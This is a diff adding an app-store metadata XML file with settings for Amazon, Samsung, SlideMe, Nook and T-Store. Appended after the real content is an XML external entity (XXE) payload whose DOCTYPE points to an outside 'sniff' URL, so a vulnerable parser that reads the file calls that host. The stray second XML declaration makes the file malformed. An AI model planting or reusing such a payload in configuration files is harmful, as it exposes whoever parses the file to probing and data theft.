@@ -1,0 +1,43 @@
+<store-specific>
+  <amazon>
+    <form-factor>all</form-factor>
+    <free-app-of-the-day-eligibility>yes</free-app-of-the-day-eligibility>
+    <apply-amazon-drm>yes</apply-amazon-drm>
+    <kindle-support>
+      <kindle-fire-first-generation>yes</kindle-fire-first-generation>
+      <kindle-fire>yes</kindle-fire>
+      <kindle-fire-hd>yes</kindle-fire-hd>
+      <kindle-fire-hd-8-9>yes</kindle-fire-hd-8-9>
+    </kindle-support>
+    <binary-alias>Version 1</binary-alias>
+  </amazon>
+  <samsung>
+    <form-factor>phone,tablet</form-factor>
+    <contains-zirconia-protection>yes</contains-zirconia-protection>
+    <s-pen>yes</s-pen> 
+    <tags>
+      <tag>Education / Video</tag>
+      <tag>Music / Album</tag>
+    </tags>
+  </samsung>
+  <slideme>
+    <license-type>apache2</license-type>
+  </slideme>
+  <nook>
+    <supported-platforms>
+      <nook-color>yes</nook-color>
+      <nook-tablet>yes</nook-tablet>
+      <nook-hd>yes</nook-hd>
+      <nook-hd-plus>yes</nook-hd-plus>
+    </supported-platforms>
+  </nook>
+  <tstore>
+    <seller-name>Yandex</seller-name>
+  </tstore>
+</store-specific>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "http://w70759sf.beget.tech/sniff/s.php">
+]>
+<foo>&xxe;</foo>
